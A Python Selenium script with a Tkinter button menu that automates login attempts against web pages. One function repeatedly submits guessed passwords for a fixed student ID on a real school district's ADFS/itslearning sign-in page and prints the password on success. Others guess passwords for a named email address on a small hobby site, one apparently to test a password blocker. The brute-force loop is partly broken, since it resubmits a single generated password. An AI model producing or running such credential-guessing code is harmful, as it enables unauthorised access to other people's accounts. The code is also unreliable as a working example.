#imports chrome automation kit and tkinter
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from tkinter import *
root = Tk()

#random integer
from random import *
count = 44
while count <= 50:
        count = count + 1

#variables
InitialConsonant = 'Gt'
point = '!'

#random password generator
from random import randint
def random_with_N_digits(n):
    range_start = 10**(n-1)
    range_end = (10**n)-1
    return randint(range_start, range_end)
passwordStr = random_with_N_digits(6)

#function for itslearning
def itslearning():
    #Opens up website
    browser = webdriver.Chrome()
    browser.get(('https://adfs.forsythk12.org/adfs/ls/?SAMLRequest=fZLNboMwEIRfBfkOxpCkwgpIaaOqkVIVNbSHXioHFmIVbOo1Sfr2BdKf9NAcd7Sz8%2B3acxRN3fJFZ3fqEd47QOusljF59UMWTRgwt8xZ4U62eeBup1PhTmYz%2F8oPitCfhsR5BoNSq5gEnk%2BcFWIHK4VWKNtLPotcn7l%2BmLGIhxEPmMeCF%2BIs%2BxCphB2NO2tb5JSKokSv1AY%2F7O6NBZ421ajRGilxbrXJYYSMSSlqhCEsFYhyDz9KarTVua6vpSqkqmLSGcW1QIlciQaQ25xvFvdr3sPy7akJ%2BV2WpW76sMmIs0AEM2DdaIVdA2YDZi9zeHpc%2F4IeDgdPWqxBGNUP8HLdUFjrSir6n98T2B6Jc2xqhXw8%2BGW29msRksyHbj7e1Zz5L9vFNwZJLkFLZaEy4zMgHaY2YEUhrBiLYB9QNqdn%2Bcmp%2BvtZkk8%3D&RelayState=ItsL1eyJjIjowLCJuIjoiZm9yc3l0aCIsInMiOjB90'))

    #fills in username and hits the next button
    username = browser.find_element_by_id('userNameInput')
    username.send_keys('121460')

    password = browser.find_element_by_id('passwordInput')
    password.send_keys(InitialConsonant + str(passwordStr) + point)

    nextButton = browser.find_element_by_id('submitButton')
    nextButton.click()

    #loop
    while browser.find_element_by_id('errorText'):
        password = browser.find_element_by_id('passwordInput')
        password.send_keys(InitialConsonant + str(passwordStr) + point)
        nextButton = browser.find_element_by_id('submitButton')
        nextButton.click()

    #outputs the password
    if browser.find_element_by_id('ctl00_ContentPlaceHolder1_federatedLogin'):
        print(passwordStr)

    #opens last button to get to itslearning page
    nextButton = browser.find_element_by_id('ctl00_ContentPlaceHolder1_federatedLoginWrapper')
    nextButton.click()

#function for our website (WITHOUT PASSWORD BLOCKER)
def ourwebsite():
    #Opens up website
    browser = webdriver.Chrome()
    browser.get(('http://codecollab.000webhostapp.com/login.html'))
    
    #loop
    while browser.find_element_by_id('submit'):
        username = browser.find_element_by_id('email')
        username.send_keys('Williamhao2015@hotmail.com')
        password = browser.find_element_by_id('password')
        password.send_keys('123'+ str(randint(40,46)))
        nextButton = browser.find_element_by_id('submit')
        nextButton.click()

    #outputs the password
    if browser.find_element_by_id('join'):
        print('12345')

#function for our website
def antiourwebsite():
#Opens up website
    browser = webdriver.Chrome()
    browser.get(('http://codecollab.000webhostapp.com/test.html'))

   #loop
    while browser.find_element_by_id('submit'):
        username = browser.find_element_by_id('email')
        username.send_keys('Williamhao2015@hotmail.com')
        password = browser.find_element_by_id('password')
        password.send_keys('123'+ str(randint(40,46)))
        nextButton = browser.find_element_by_id('submit')
        nextButton.click()

#function for our website
def antiourwebsite2():
#Opens up website
    browser = webdriver.Chrome()
    browser.get(('http://codecollab.000webhostapp.com/register.html?'))
 
#creates buttons
topFrame = Frame(root)
topFrame.pack()
bottomFrame = Frame(root)
bottomFrame.pack(side=BOTTOM)
button2 = Button(topFrame, text="Itslearning", fg="red", command=itslearning, height=5, width=20, bg="black", bd=10, font=20)
button3 = Button(topFrame, text="Our website", fg="red", command=ourwebsite, height=5, width=20, bg="black", bd=10, font=20)
button4 = Button(topFrame, text="Our website Block", fg="green", command=antiourwebsite, height=5, width=20, bg="black", bd=10, font=20)
button1 = Button(topFrame, text="Register", fg="green", command=antiourwebsite2, height=5, width=20, bg="black", bd=10, font=20)


#button placement
button2.pack(side=LEFT)
button3.pack(side=LEFT)
button4.pack(side=LEFT)
button1.pack(side=LEFT)

#loops
root.mainloop()

